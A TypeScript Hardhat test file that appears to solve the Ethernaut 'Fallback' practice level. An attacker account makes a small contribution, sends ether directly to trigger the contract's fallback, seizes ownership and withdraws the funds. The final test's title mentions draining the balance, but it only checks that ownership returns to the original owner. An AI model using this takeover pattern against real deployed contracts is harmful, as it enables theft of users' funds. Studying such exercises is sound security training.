import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import web3 from "web3";

import { Fallback } from "../typechain-types/Fallback";

describe("Fallback", function () {
  let attacker: SignerWithAddress;
  let owner: SignerWithAddress;
  let fallback: Fallback;

  before(async function () {
    [owner, attacker] = await ethers.getSigners();

    const FallbackFactory = await ethers.getContractFactory("Fallback");
    fallback = await FallbackFactory.deploy();
  });

  describe("Deployment", function () {
    it("Owner contributions should be 1000 ether", async function () {
      expect(await fallback.connect(owner).getContribution()).to.equal(
        web3.utils.toWei("1000")
      );
    });
  });

  describe("Withdraw funds", function () {
    before(async function () {
      await fallback
        .connect(attacker)
        .contribute({ value: web3.utils.toWei("0.0005") });
    });

    it("Attacker should claim ownership of the contract", async function () {
      await attacker.sendTransaction({
        to: fallback.address,
        value: web3.utils.toWei("0.0006"),
      });
      expect(await fallback.owner()).to.equal(attacker.address);
    });

    it("Attacker should reduce contract balance to 0", async function () {
      await fallback.connect(attacker).withdraw();
      await fallback
        .connect(owner)
        .contribute({ value: web3.utils.toWei("0.0005") });
      expect(await fallback.owner()).to.equal(owner.address);
    });
  });
});
